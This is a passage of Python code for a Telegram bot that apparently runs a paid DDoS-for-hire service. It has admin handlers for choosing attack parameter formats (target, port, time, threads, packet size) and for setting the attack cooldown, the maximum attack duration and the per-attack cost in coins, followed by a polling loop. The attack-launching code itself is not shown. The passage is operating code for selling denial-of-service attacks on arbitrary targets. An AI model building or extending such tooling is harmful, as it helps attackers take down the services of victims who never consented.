    if full_command_type == 1:
        response_message = "✅ 𝗦𝗲𝗹𝗲𝗰𝘁𝗲𝗱 𝗣𝗮𝗿𝗮𝗺𝗲𝘁𝗲𝗿𝘀 1:\n `<target> <port> <time>`"
    elif full_command_type == 2:
        response_message = "✅ 𝗦𝗲𝗹𝗲𝗰𝘁𝗲𝗱 𝗣𝗮𝗿𝗮𝗺𝗲𝘁𝗲𝗿𝘀 2:\n `<target> <port> <time> <threads>`"
    elif full_command_type == 3:
        response_message = "✅ 𝗦𝗲𝗹𝗲𝗰𝘁𝗲𝗱 𝗣𝗮𝗿𝗮𝗺𝗲𝘁𝗲𝗿𝘀 3:\n `<target> <port> <time> <packet> <threads>`"
    else:
        response_message = "❗𝗜𝗻𝘃𝗮𝗹𝗶𝗱 𝘀𝗲𝗹𝗲𝗰𝘁𝗶𝗼𝗻."

    bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id, text=response_message, parse_mode='Markdown')
        
@bot.message_handler(func=lambda message: message.text == "Attack Cooldown")
def set_attack_cooldown(message):
    """Admin command to change attack cooldown time."""
    user_id = str(message.chat.id)
    if user_id in admin_id:
        bot.reply_to(message, "🕒 𝗘𝗻𝘁𝗲𝗿 𝗻𝗲𝘄 𝗮𝘁𝘁𝗮𝗰𝗸 𝗰𝗼𝗼𝗹𝗱𝗼𝘄𝗻 (𝗶𝗻 𝘀𝗲𝗰𝗼𝗻𝗱𝘀):")
        bot.register_next_step_handler(message, process_new_attack_cooldown)
    else:
        bot.reply_to(message, "⛔️ 𝗬𝗼𝘂 𝗮𝗿𝗲 𝗻𝗼𝘁 𝗮𝗻 𝗮𝗱𝗺𝗶𝗻.")

def process_new_attack_cooldown(message):
    global ATTACK_COOLDOWN
    try:
        new_cooldown = int(message.text)
        ATTACK_COOLDOWN = new_cooldown
        save_config()  # Save changes
        bot.reply_to(message, f"✅ 𝗔𝘁𝘁𝗮𝗰𝗸 𝗰𝗼𝗼𝗹𝗱𝗼𝘄𝗻 𝗰𝗵𝗮𝗻𝗴𝗲𝗱 𝘁𝗼: {new_cooldown} 𝘀𝗲𝗰𝗼𝗻𝗱𝘀")
    except ValueError:
        bot.reply_to(message, "❗𝗜𝗻𝘃𝗮𝗹𝗶𝗱 𝗻𝘂𝗺𝗯𝗲𝗿! 𝗣𝗹𝗲𝗮𝘀𝗲 𝗲𝗻𝘁𝗲𝗿 𝗮 𝘃𝗮𝗹𝗶𝗱 𝗻𝘂𝗺𝗲𝗿𝗶𝗰 𝘃𝗮𝗹𝘂𝗲.")
        
@bot.message_handler(func=lambda message: message.text == "Attack Time")
def set_attack_time(message):
    """Admin command to change max attack time."""
    user_id = str(message.chat.id)
    if user_id in admin_id:
        bot.reply_to(message, "⏳ 𝗘𝗻𝘁𝗲𝗿 𝗺𝗮𝘅 𝗮𝘁𝘁𝗮𝗰𝗸 𝗱𝘂𝗿𝗮𝘁𝗶𝗼𝗻 (𝗶𝗻 𝘀𝗲𝗰𝗼𝗻𝗱𝘀):")
        bot.register_next_step_handler(message, process_new_attack_time)
    else:
        bot.reply_to(message, "⛔️ 𝗬𝗼𝘂 𝗮𝗿𝗲 𝗻𝗼𝘁 𝗮𝗻 𝗮𝗱𝗺𝗶𝗻.")

def process_new_attack_time(message):
    global MAX_ATTACK_TIME
    try:
        new_attack_time = int(message.text)
        MAX_ATTACK_TIME = new_attack_time
        save_config()  # Save changes
        bot.reply_to(message, f"✅ 𝗠𝗮𝘅 𝗮𝘁𝘁𝗮𝗰𝗸 𝘁𝗶𝗺𝗲 𝗰𝗵𝗮𝗻𝗴𝗲𝗱 𝘁𝗼: {new_attack_time} 𝘀𝗲𝗰𝗼𝗻𝗱𝘀")
    except ValueError:
        bot.reply_to(message, "❗𝗜𝗻𝘃𝗮𝗹𝗶𝗱 𝗻𝘂𝗺𝗯𝗲𝗿! 𝗣𝗹𝗲𝗮𝘀𝗲 𝗲𝗻𝘁𝗲𝗿 𝗮 𝘃𝗮𝗹𝗶𝗱 𝗻𝘂𝗺𝗲𝗿𝗶𝗰 𝘃𝗮𝗹𝘂𝗲.")

@bot.message_handler(func=lambda message: message.text == "Attack cost")
def set_attack_cost(message):
    """Admin command to change max attack time."""
    user_id = str(message.chat.id)
    if user_id in admin_id:
        bot.reply_to(message, "⏳ 𝗘𝗻𝘁𝗲𝗿 𝗻𝗲𝘄 𝗮𝘁𝘁𝗮𝗰𝗸 𝗰𝗼𝘀𝘁:")
        bot.register_next_step_handler(message, process_new_attack_cost)
    else:
        bot.reply_to(message, "⛔️ 𝗬𝗼𝘂 𝗮𝗿𝗲 𝗻𝗼𝘁 𝗮𝗻 𝗮𝗱𝗺𝗶𝗻.")

def process_new_attack_cost(message):
    global ATTACK_COST
    try:
        new_attack_cost = int(message.text)
        ATTACK_COST = new_attack_cost
        save_config()  # Save changes
        bot.reply_to(message, f"✅ 𝗡𝗲𝘄 𝗮𝘁𝘁𝗮𝗰𝗸 𝗰𝗼𝘀𝘁 𝗰𝗵𝗮𝗻𝗴𝗲𝗱 𝘁𝗼: {new_attack_cost} 𝗖𝗼𝗶𝗻𝘀")
    except ValueError:
        bot.reply_to(message, "❗𝗜𝗻𝘃𝗮𝗹𝗶𝗱 𝗻𝘂𝗺𝗯𝗲𝗿! 𝗣𝗹𝗲𝗮𝘀𝗲 𝗲𝗻𝘁𝗲𝗿 𝗮 𝘃𝗮𝗹𝗶𝗱 𝗻𝘂𝗺𝗲𝗿𝗶𝗰 𝘃𝗮𝗹𝘂𝗲.")

if __name__ == "__main__":
    while True:
        load_data()
        try:
            bot.polling(none_stop=True)
        except Exception as e:
            print(e)
            # Add a small delay to avoid rapid looping in case of persistent errors
            time.sleep(3)
